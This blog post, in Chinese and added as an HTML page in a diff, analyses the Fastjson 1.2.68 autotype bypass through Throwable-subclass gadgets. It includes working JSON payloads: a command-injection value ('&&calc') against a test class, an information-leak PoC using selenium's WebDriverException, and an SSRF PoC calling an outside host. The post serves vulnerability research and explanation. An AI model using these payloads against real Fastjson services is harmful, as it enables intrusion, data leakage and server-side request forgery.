@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Fastjson 1.2.68 最新版本有限制 autotype bypass一、漏洞简介该漏洞和以往的 autotype bypass 不同，要求 gadget 必须继承自 Throwable异常类，所以常见的 JNDI gadget 就无法在此处使用。 所以只能找在异常类中的构造方法、set方法、get方法、toString等方法内的敏感操作才会触发漏洞。 由于异常类中很少使用高危函数，所以我">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Fastjson/Fastjson%201.2.68%20%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E6%9C%89%E9%99%90%E5%88%B6%20autotype%20bypass/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Fastjson 1.2.68 最新版本有限制 autotype bypass一、漏洞简介该漏洞和以往的 autotype bypass 不同，要求 gadget 必须继承自 Throwable异常类，所以常见的 JNDI gadget 就无法在此处使用。 所以只能找在异常类中的构造方法、set方法、get方法、toString等方法内的敏感操作才会触发漏洞。 由于异常类中很少使用高危函数，所以我">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-08T06:25:56.498Z">
+<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Fastjson/Fastjson 1.2.68 最新版本有限制 autotype bypass" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Fastjson/Fastjson%201.2.68%20%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E6%9C%89%E9%99%90%E5%88%B6%20autotype%20bypass/" class="article-date">
+  <time datetime="2022-07-08T06:25:56.498Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Fastjson-1-2-68-最新版本有限制-autotype-bypass"><a href="#Fastjson-1-2-68-最新版本有限制-autotype-bypass" class="headerlink" title="Fastjson 1.2.68 最新版本有限制 autotype bypass"></a>Fastjson 1.2.68 最新版本有限制 autotype bypass</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>该漏洞和以往的 autotype bypass 不同，要求 gadget 必须继承自 Throwable<br>异常类，所以常见的 JNDI gadget 就无法在此处使用。</p>
+<p>所以只能找在异常类中的构造方法、set方法、get方法、toString等方法内的敏感操作才会触发漏洞。</p>
+<p>由于异常类中很少使用高危函数，所以我目前还没有找到可以 RCE 的<br>gadget，只找到了几个非 RCE 的 gadget。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Fastjson 1.2.68</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>反序列化时如果遇到 @type 指定的类为 Throwable<br>的子类那对应的反序列化处理类就是 ThrowableDeserializer</p>
+<p>1.jpg</p>
+<p>漏洞点在 <code>ThrowableDeserializer#deserialze</code></p>
+<p>2.jpg</p>
+<p>当第二个字段的 key 也是 @type 的时候就会取 value 当做类名做一次<br>checkAutoType 检测。</p>
+<p>调用 <code>ParserConfig#checkAutoType</code> 时注意第二个参数，它指定了第二个参数<br>expectClass 为 Throwable.class 类对象，通常情况下这个参数都是 null。</p>
+<p>checkAutoType 一般有以下几种情况会通过校验。</p>
+<ol>
+<li><p> 白名单里的类</p>
+</li>
+<li><p> 开启了 autotype</p>
+</li>
+<li><p> 使用了 JSONType 注解</p>
+</li>
+<li><p> 指定了期望类（expectClass）</p>
+</li>
+<li><p> 缓存 mapping 中的类</p>
+</li>
+</ol>
+<p>1.2.68 又更新了一个使用了 ParserConfig.AutoTypeCheckHandler<br>接口通过校验的类。</p>
+<p>这个漏洞实际上就是基于第四种，指定了期望类的情况。</p>
+<p>3.jpg</p>
+<p>这里判断了如果期望类不为空且反序列化目标类继承自期望类就会添加到缓存<br>mapping 并且返回这个 class。</p>
+<p>4.jpg</p>
+<p>autotype 检测通过后就会开始实例化异常类对象。</p>
+<p>同时把 message 和 cause 传给了 ThrowableDeserializer#createException<br>处理。</p>
+<p>5.jpg</p>
+<p>依次按照以下顺序进行实例化构造方法参数1类型为String.class且参数2类型为Throwable.class，如果找不到就按照参数1类型为String.class，还找不到就取无参构造方法。</p>
+<p>6.jpg</p>
+<p>最后为被实例化后的异常类装配属性。</p>
+<p>遍历 otherValues ，按照 key 去调用异常类的 set 方法，otherValue 是当前<br>jsonobject 对象中除了 @type、message、cause、stackTrace<br>以外的其他字段。</p>
+<p>例如 @type 的类是 java.lang.Exception，otherValues 的第一条是<br>&quot;msg&quot;=&gt;&quot;hello&quot;。</p>
+<p>那么这里就会先去实例化 Exception 对象，再去调用<br>exception.setMsg(&quot;hello&quot;)</p>
+<p>这里就是 set 触发的地方，而get方法则会在 JSON 转 JSONObject<br>的时候会调用该异常类的所有 get 方法。</p>
+<p>也可以通过 $ref 字段借助 JSONPath 去访问 get 方法，关于 JSONPath<br>，我在博客中的另一篇”fastjson 1.2.62 拒绝服务漏洞”文章中有提到过。</p>
+<p>问题分析完了，下面就是如何去寻找合适的 gadget 触发漏洞了。</p>
+<p>我自己先写一个存在问题的异常类，去验证一下问题。</p>
+<pre><code>public class PingException extends Exception &#123;
+
+    private String domain;
+
+    public PingException() &#123;
+        super();
+    &#125;
+
+    public String getDomain() &#123;
+        return domain;
+    &#125;
+
+    public void setDomain(String domain) &#123;
+        this.domain = domain;
+    &#125;
+
+    @Override
+    public String getMessage() &#123;
+        try &#123;
+            Runtime.getRuntime().exec(&quot;cmd /c ping &quot;+domain);
+        &#125; catch (IOException e) &#123;
+            return e.getMessage();
+        &#125;
+
+        return super.getMessage();
+    &#125;
+&#125;
+ 复制
+</code></pre>
+<p>构造的 JSON 如下</p>
+<pre><code>&#123;&quot;@type&quot;:&quot;java.lang.Throwable&quot;, &quot;@type&quot;:&quot;PingException&quot;,&quot;domain&quot;:&quot;b1ue.cn&amp;&amp;calc&quot;&#125;
+</code></pre>
+<p>7.jpg</p>
+<p>当然这只是用来测试的，真实情况很少有人把执行命令的方法写进异常类。</p>
+<p>不过我找到了 selenium 的一个敏感信息泄露，selenium<br>一般用来操控浏览器进行爬虫，在很多基于浏览器操作的爬虫项目里都会使用到<br>selenium，如果同时也使用了 fastjson ，就会存在敏感信息泄露的问题。</p>
+<p><code>org.openqa.selenium.WebDriverException</code> 会输出这些信息主机IP、主机名、系统名、系统架构、操作系统版本、java版本、Selenium版本、webdriver驱动版本等等一系列信息。</p>
+<p>同时由于是异常类，父类的 getStackTrace()<br>也会被调用，会输出当前方法栈信息，可从中看出使用了什么框架。</p>
+<p>8.jpg</p>
+<p>这是反序列化<code>org.openqa.selenium.WebDriverException</code>类输出的信息。</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h4><pre><code>&#123;&quot;content&quot;:&#123;&quot;$ref&quot;:&quot;$x.systemInformation&quot;&#125;, &quot;x&quot;: &#123;&quot;@type&quot;:&quot;java.lang.Exception&quot;,&quot;@type&quot;:&quot;org.openqa.selenium.WebDriverException&quot;&#125;&#125;
+</code></pre>
+<p>QQ截图20200528144437.png</p>
+<p>还可以看到一些方法栈信息，看到一些服务端使用的框架的信息。</p>
+<p>当然这个前提是需要WEB应用的classpath存在selenium-api。</p>
+<p>作者提出还有一个思路可以SSRF(当然也需要相应的classpath)：</p>
+<p>从mvn引入，或者自己写一个类：</p>
+<pre><code>package org.joychou;
+
+import javax.activation.DataSource;
+import javax.activation.URLDataSource;
+import java.net.URL;
+
+public class DatasourceException extends Exception &#123;
+
+    public DatasourceException() &#123;
+
+    &#125;
+
+    private DataSource dataSource;
+
+    public DataSource getDataSource() &#123;
+        return dataSource;
+    &#125;
+
+    public void setDataSource(URL url) &#123;
+        this.dataSource = new URLDataSource(url);
+    &#125;
+&#125;
+</code></pre>
+<p>2.png</p>
+<h4 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h4><pre><code>&#123;&quot;@type&quot;:&quot;java.lang.Exception&quot;,&quot;@type&quot;:&quot;org.joychou.DatasourceException&quot;, &quot;dataSource&quot;: &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;: &quot;http://www.0-sec.org:8888/fastjson&quot;&#125;&#125;
+</code></pre>
+<p>3.png</p>
+<h2 id="参考了链接"><a href="#参考了链接" class="headerlink" title="参考了链接"></a>参考了链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://b1ue.cn/archives/348.html">https://b1ue.cn/archives/348.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/caiqiiqi/article/details/106050079">https://blog.csdn.net/caiqiiqi/article/details/106050079</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Fastjson/Fastjson%201.2.68%20%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E6%9C%89%E9%99%90%E5%88%B6%20autotype%20bypass/" data-id="cl5c2qp4i0076y8v1bg8x06gy" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Fastjson/Fastjson%20_=1.2.47%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Fastjson/Fastjson%201.2.68%20bypass%20autotype/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
